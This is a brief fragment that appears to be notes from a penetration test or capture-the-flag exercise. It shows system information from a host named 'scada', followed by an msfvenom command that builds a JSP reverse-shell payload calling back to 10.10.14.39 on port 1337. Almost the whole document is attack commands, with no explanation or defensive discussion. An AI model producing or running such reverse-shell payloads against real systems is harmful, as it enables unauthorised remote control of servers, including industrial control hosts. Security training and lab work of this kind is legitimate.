```bash
Command: uname -a

Linux scada 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```


```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.39 LPORT=1337 -f raw > blue.jsp
```